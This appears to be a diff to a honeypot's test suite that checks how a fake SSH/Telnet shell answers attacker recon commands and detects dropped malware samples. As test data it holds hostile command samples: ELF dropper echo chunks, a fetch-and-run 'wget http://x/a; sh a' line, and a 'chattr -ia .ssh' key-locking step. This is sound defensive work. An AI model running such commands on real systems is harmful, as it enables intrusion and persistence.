@@ -395,7 +395,7 @@ class SSHHoneypotTests(HoneypotBase):
         chan = client.open_session()
         chan.exec_command("uname -a; /bin/busybox XQZ")
         out = chan.makefile("rb").read().decode()
-        self.assertIn("armv7l", out)
+        self.assertIn("x86_64", out)  # SSH zeigt das Serverprofil
         self.assertIn("XQZ: applet not found", out)
         client.close()
         rows = self.wait_events(3)
@@ -442,10 +442,11 @@ class TelnetHoneypotTests(HoneypotBase):
             sock.sendall(b"root\r\nroot\r\n")
             sock.sendall(b"echo -ne '\\x7f\\x45\\x4c\\x46\\x01\\x01' > .d\r\n")
             sock.sendall(b"echo -ne '" + b"\\x00" * 12 + b"\\x08\\x00' >> .d\r\n")
+            sock.sendall(b"echo -ne '" + b"\\x00" * 120 + b"' >> .d\r\n")  # erst ab MIN_ELF ein Sample
             time.sleep(0.3)
-        rows = self.wait_events(4)
+        rows = self.wait_events(5)
         self.assertEqual(rows[-1][0], "Malware-Sample")
-        self.assertIn("· 20 B · ELF MIPS · echo > .d", rows[-1][2])
+        self.assertIn("· 140 B · ELF MIPS · echo > .d", rows[-1][2])
 
 
 class FakeShellTests(unittest.TestCase):
@@ -466,6 +467,23 @@ class FakeShellTests(unittest.TestCase):
         drops.feed("echo -ne '\\x43' >> .t")
         self.assertEqual(drops.files, {".t": b"ABC"})
         self.assertFalse(samples.looks_executable(b"ABC"))
+        self.assertFalse(samples.looks_executable(b"\x7fELF\x01\x01" + b"\x00" * 25))  # Dropper-Test mit ELF-Kopf
+        self.assertTrue(samples.looks_executable(b"#!/bin/sh\nwget http://x/a; sh a"))
+
+    def test_server_profile_answers_recon(self):
+        server = fakeshell.SERVER
+        self.assertEqual(fakeshell.respond("uname -s -v -n -r -m", server),
+                         "Linux web01 6.1.0-28-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.119-1 (2024-11-22) x86_64\r\n")
+        self.assertEqual(fakeshell.respond("uname -m"), "armv7l\r\n")  # Telnet bleibt Router
+        self.assertEqual(fakeshell.respond("cat /proc/cpuinfo | grep name | wc -l", server), "4\r\n")
+        self.assertEqual(fakeshell.respond(
+            "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'", server),
+            "Intel(R) Xeon(R) CPU E5-2680 v4 @\r\n")
+        self.assertEqual(fakeshell.respond("free -m | grep Mem | awk '{print $2 ,$3}'", server), "7941 1187\r\n")
+        self.assertEqual(fakeshell.respond("df -h | head -n 2 | awk 'FNR == 2 {print $2;}'", server), "79G\r\n")
+        self.assertEqual(fakeshell.respond("cd ~; chattr -ia .ssh; lockr -ia .ssh", server),
+                         "-bash: lockr: command not found\r\n")
+        self.assertEqual(fakeshell.respond("which ls >/dev/null 2>&1 && echo ok", server), "ok\r\n")
 
     def test_samples_only_from_public_addresses(self):
         with self.assertRaises(ValueError):
